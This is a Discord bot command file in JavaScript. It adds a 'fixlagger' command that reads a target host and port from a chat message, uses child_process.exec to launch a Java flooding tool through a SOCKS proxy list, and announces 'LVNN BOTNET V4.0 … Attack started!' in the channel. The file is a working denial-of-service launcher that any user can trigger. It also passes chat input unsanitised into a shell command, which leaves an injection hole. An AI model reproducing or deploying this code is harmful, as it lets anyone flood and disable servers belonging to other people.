const Discord = require("discord.js");

exports.run = async (client, message, args) => {
const host = args.join(" ").split(":").slice(0,1)
const port = message.content.split (":")[1]
const proxy = args.join(" ").slice(2)
var exec = require('child_process').exec
exec(`java -jar AphonicMethods.jar {$host}:${port} 10000 1 overload socks_proxies.txt`, (error, stdout, stderr) => {
});
console.log('An Attack Launched Discord ID:' +  message.guild.id)
const embed = new Discord.MessageEmbed()
	.setColor('RANDOM')
	.setTitle('๐ฅ **LVNN BOTNET V4.0** ๐ฅ')
	.setTimestamp()
	.setDescription("**โบ Method: FixLagger ๐ฅ** \n \n โบ Attack started! โ \n โบ for 120 seconds! ๐ \n โ Flood by BlackCrack SQUAD โ")
	.setFooter('ยฉ Developer Mareczekkkk#9738.', client.user.avatarURL)
	.setTimestamp()
	.setThumbnail("")
 message.channel.send(embed);
  }

exports.conf = {
  enabled: true,
  guildOnly: false,
  aliases: ['fixlagger'],
  permLevel: 0
}

exports.help = {
  name: 'fixlagger',
  description: 'รzel',
  usage: 'fixlagger'
}